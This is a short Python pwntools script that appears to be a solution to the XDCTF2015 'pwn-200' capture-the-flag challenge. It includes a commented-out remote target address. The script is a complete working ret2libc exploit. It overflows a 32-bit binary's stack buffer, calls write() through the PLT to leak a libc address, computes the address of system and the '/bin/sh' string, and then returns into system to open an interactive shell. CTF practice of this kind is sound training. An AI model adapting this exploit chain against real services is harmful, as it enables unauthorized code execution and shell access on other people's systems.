import pwn

pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./pwn-200')
#p = pwn.remote('220.249.52.133', 50039)

e = pwn.ELF('./pwn-200')

libc = pwn.ELF('/lib32/libc-2.31.so')   # 适用于本地，已知libc库版本，这里假设是2.31版本

main_addr = pwn.p32(0x080484be)
write_plt = pwn.p32(e.plt['write'])
write_got = pwn.p32(e.got['write'])

payload = b'A' * 108 + b'B' * 4 + write_plt + main_addr + pwn.p32(1) + write_got + pwn.p32(4)

p.sendlineafter(b'Welcome to XDCTF2015~!\n', payload)

write_addr = p.recv(4)
write_addr = pwn.u32(write_addr)

libc_base = write_addr - libc.sym['write']
system_addr = pwn.p32(libc_base + libc.sym['system'])
sh_addr = pwn.p32(libc_base + next(libc.search('/bin/sh')))

payload2 = b'A' * 108 + b'B' * 4 + system_addr + b'C' * 4 + sh_addr

p.sendlineafter(b'Welcome to XDCTF2015~!\n', payload2)

p.interactive()
